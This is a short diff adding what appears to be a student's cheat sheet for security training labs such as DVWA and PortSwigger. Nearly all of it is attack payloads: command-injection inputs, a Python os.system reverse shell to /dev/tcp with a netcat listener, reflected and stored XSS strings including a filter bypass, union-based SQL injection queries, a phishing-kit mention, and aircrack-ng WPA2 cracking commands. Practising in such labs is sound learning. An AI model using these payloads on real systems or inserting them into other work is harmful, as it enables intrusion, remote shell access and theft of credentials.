@@ -1,0 +1,40 @@
+﻿1. Finding CSRF
+2. Command Injection DVWA
+        ;ls
+        |ls
+        |ls
+3. Command Injection Attack Def (Vulnerable Code IDE - Command Injection)
+        import os 
+        os.system(’id’)
+        nc listener - nc -lvp 4444
+        os.system(’bash -c ‘bash -i >& /dev/tcp/<ip>/4444 0>&1’’)
+        find / -name flag 2>/dev/null
+        cat /tmp/flag
+4. Brute Force attack
+5. Intercepting with burp suite
+6. File Upload DVWA
+7. XSS DVWA
+        Reflected
+                <script>alert(“XSS”)</script>
+                <Script>alert(“XSS”)</Script>
+                <body onload=alert(“hi”)>
+        Stored
+                Name = Any name
+                Message = <script>alert(“hi”)</script>
+                Name = {inspect element-> Name textbook’s length ->1000
+                <scr<script>ipt>alert(“hi”)</scr<script>ipt>
+                Message = Any Message
+                Name = {inspect element-> Name textbook’s length ->1000}
+                <body onload=alert(“XSS”)>
+                Message = Any Message
+        DOM
+8. SQLi Port Swigger
+        ‘ order by 3—
+        ‘ union select null, null from dual—
+        ‘ union select table_name, null from all_tables—
+        ‘ union select column_name, null from all_tab_columns where table_name=<value>
+        ‘ union select <value>, <value> from <value>
+9. Phishing - zphisher
+10. Wifi Hacking (WPA2 PSK Cracking)
+        airodump-ng -r <pcap_file>
+        aircrack-ng -w <wordlist> -b <bssid> <pcap_file>
